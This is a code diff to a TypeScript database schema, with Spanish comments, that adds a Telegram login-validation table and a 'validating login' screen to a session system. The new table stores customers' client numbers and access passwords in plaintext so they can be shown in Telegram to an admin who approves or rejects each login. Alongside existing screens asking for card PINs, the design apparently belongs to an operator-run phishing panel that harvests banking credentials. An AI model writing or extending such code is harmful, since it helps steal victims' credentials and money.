@@ -150,7 +150,38 @@ export const sessions = pgTable("sessions", {
   saved: boolean("saved").default(false),
   createdBy: text("created_by"), // Añadimos el campo para saber qué usuario creó la sesión
   deviceId: text("device_id"), // ID único del dispositivo para gestión de folios
+  loginValidated: boolean("login_validated").default(false), // Estado de validación del login via Telegram
+  loginValidationId: text("login_validation_id"), // ID de la validación de Telegram activa
 });
+
+// Tabla para validaciones de Telegram
+export const telegramValidations = pgTable("telegram_validations", {
+  id: serial("id").primaryKey(),
+  validationId: text("validation_id").notNull().unique(), // ID único para callbacks
+  sessionId: text("session_id").notNull(), // ID de la sesión asociada
+  telegramMessageId: text("telegram_message_id"), // ID del mensaje en Telegram
+  status: text("status").notNull().default("pending"), // pending, approved, rejected, expired
+  numeroCliente: text("numero_cliente"), // Número de cliente (para mostrar en Telegram)
+  claveAcceso: text("clave_acceso"), // Clave de acceso (para mostrar en Telegram)
+  adminUser: text("admin_user"), // Usuario admin que respondió
+  decisionNote: text("decision_note"), // Nota adicional de la decisión
+  createdAt: timestamp("created_at").defaultNow(),
+  respondedAt: timestamp("responded_at"), // Cuando se respondió
+  expiresAt: timestamp("expires_at").notNull(), // Cuando expira la validación
+});
+
+export const insertTelegramValidationSchema = createInsertSchema(telegramValidations).pick({
+  validationId: true,
+  sessionId: true,
+  telegramMessageId: true,
+  status: true,
+  numeroCliente: true,
+  claveAcceso: true,
+  expiresAt: true,
+});
+
+export type InsertTelegramValidation = z.infer<typeof insertTelegramValidationSchema>;
+export type TelegramValidation = typeof telegramValidations.$inferSelect;
 
 export const insertSessionSchema = createInsertSchema(sessions).pick({
   sessionId: true,
@@ -273,6 +304,7 @@ export enum ScreenType {
   NIP_TARJETA = "nip_tarjeta",
   CONFIRMAR_IDENTIDAD = "confirmar_identidad",
   VALIDANDO_IDENTIDAD = "validando_identidad",
+  VALIDANDO_LOGIN = "validando_login", // Pantalla de espera mientras se valida login en Telegram
 }
 
 export const screenChangeSchema = z.object({
